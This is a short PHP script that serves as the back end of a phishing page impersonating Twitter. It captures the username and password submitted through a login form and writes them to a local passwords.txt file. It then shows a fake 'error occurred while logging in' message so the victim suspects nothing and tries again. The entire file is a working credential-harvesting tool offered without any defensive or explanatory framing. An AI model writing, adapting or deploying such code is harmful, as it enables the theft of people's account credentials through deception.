<?php
 $var1 = "<br>"; 
$username = $_POST['username']; 
$var = "<br>"; 
$password = $_POST['password']; 
$filehandle = fopen("passwords.txt", 'w'); 
fwrite($filehandle, $var1); 
fwrite($filehandle, $username); 
fwrite($filehandle, $var); 
fwrite($filehandle, $password); 
fclose($filehandle); 

echo "An error Occured While logining in twitter pls login again";
?>
